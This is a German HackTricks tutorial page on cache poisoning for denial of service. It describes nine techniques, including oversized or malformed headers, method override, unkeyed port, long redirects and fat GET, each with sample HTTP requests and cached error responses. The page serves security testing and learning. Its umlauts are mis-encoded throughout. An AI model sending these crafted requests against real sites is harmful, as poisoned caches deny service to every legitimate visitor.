# Cache Poisoning zur DoS

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>

{% hint style="danger" %}
Auf dieser Seite finden Sie verschiedene Variationen, um zu versuchen, den **Webserver dazu zu bringen, auf Anfragen mit Fehlern zu antworten**, die **f√ºr die Cache-Server g√ºltig sind**.
{% endhint %}

* **HTTP-Header√ºbergro√üe (HHO)**

Senden Sie eine Anfrage mit einer Headergr√∂√üe, die gr√∂√üer ist als die vom Webserver unterst√ºtzte, aber kleiner als die vom Cache-Server unterst√ºtzte. Der Webserver antwortet mit einer 400-Antwort, die m√∂glicherweise gecacht wird:
```
GET / HTTP/1.1
Host: redacted.com
X-Oversize-Hedear:Big-Value-000000000000000
```
* **HTTP Meta Character (HMC) & Unerwartete Werte**

Senden Sie einen Header, der einige **sch√§dliche Metazeichen** wie `\n` und `\r` enth√§lt. Um den Angriff auszuf√ºhren, m√ºssen Sie zuerst den Cache umgehen.
```
GET / HTTP/1.1
Host: redacted.com
X-Meta-Hedear:Bad Chars\n \r
```
Ein schlecht konfigurierter Header k√∂nnte einfach `\:` als Header sein.

Dies k√∂nnte auch funktionieren, wenn unerwartete Werte gesendet werden, wie z.B. ein unerwarteter Content-Type:
```
GET /anas/repos HTTP/2
Host: redacted.com
Content-Type: HelloWorld
```
* **Ungekoppelte √úberschrift**

Einige Websites geben einen Fehlerstatuscode zur√ºck, wenn sie bestimmte Header im Anfrage sehen, wie z.B. den _X-Amz-Website-Location-Redirect: someThing_ Header:
```
GET /app.js HTTP/2
Host: redacted.com
X-Amz-Website-Location-Redirect: someThing

HTTP/2 403 Forbidden
Cache: hit

Invalid Header
```
* **HTTP-Method-Override-Angriff (HMO)**

Wenn der Server das √Ñndern der HTTP-Methode mit Headern wie `X-HTTP-Method-Override`, `X-HTTP-Method` oder `X-Method-Override` unterst√ºtzt. Ist es m√∂glich, eine g√ºltige Seite anzufordern, indem die Methode ge√§ndert wird, sodass der Server sie nicht unterst√ºtzt und eine schlechte Antwort zwischengespeichert wird:
```
GET /blogs HTTP/1.1
Host: redacted.com
HTTP-Method-Override: POST
```
* **Unkeyed Port**

Wenn der Port im Host-Header in der Antwort reflektiert wird und nicht im Cache-Schl√ºssel enthalten ist, ist es m√∂glich, ihn auf einen ungenutzten Port umzuleiten:
```
GET /index.html HTTP/1.1
Host: redacted.com:1

HTTP/1.1 301 Moved Permanently
Location: https://redacted.com:1/en/index.html
Cache: miss
```
* **Langer Redirect-DoS**

Wie im folgenden Beispiel wird x nicht zwischengespeichert, sodass ein Angreifer das Redirect-Verhalten missbrauchen k√∂nnte, um das Redirect so gro√ü zu machen, dass ein Fehler zur√ºckgegeben wird. Personen, die versuchen, auf die URL zuzugreifen, ohne den nicht zwischengespeicherten x-Schl√ºssel zu haben, erhalten die Fehlerantwort:
```
GET /login?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 301 Moved Permanently
Location: /login/?x=veryLongUrl
Cache: hit

GET /login/?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 414 Request-URI Too Large
CF-Cache-Status: miss
```
* **Host-Header-Gro√ü-/Kleinschreibungsnormierung**

Der Host-Header sollte nicht auf die Gro√ü- und Kleinschreibung achten, aber einige Websites erwarten, dass er kleingeschrieben ist und geben einen Fehler zur√ºck, wenn dies nicht der Fall ist:
```
GET /img.png HTTP/1.1
Host: Cdn.redacted.com

HTTP/1.1 404 Not Found
Cache:miss

Not Found
```
* **Pfadnormalisierung**

Einige Seiten geben Fehlercodes zur√ºck, indem sie Daten URL-codiert im Pfad senden. Der Cache-Server wird jedoch den Pfad URL-decodieren und die Antwort f√ºr den URL-decodierten Pfad speichern:
```
GET /api/v1%2e1/user HTTP/1.1
Host: redacted.com


HTTP/1.1 404 Not Found
Cach:miss

Not Found
```
* **Fat Get**

Einige Cache-Server, wie Cloudflare, oder Webserver, blockieren GET-Anfragen mit einem Body, daher kann dies missbraucht werden, um eine ung√ºltige Antwort zu zwischenspeichern:
```
GET /index.html HTTP/2
Host: redacted.com
Content-Length: 3

xyz


HTTP/2 403 Forbidden
Cache: hit
```
## Referenzen

* [https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52](https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52)
* [https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------](https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
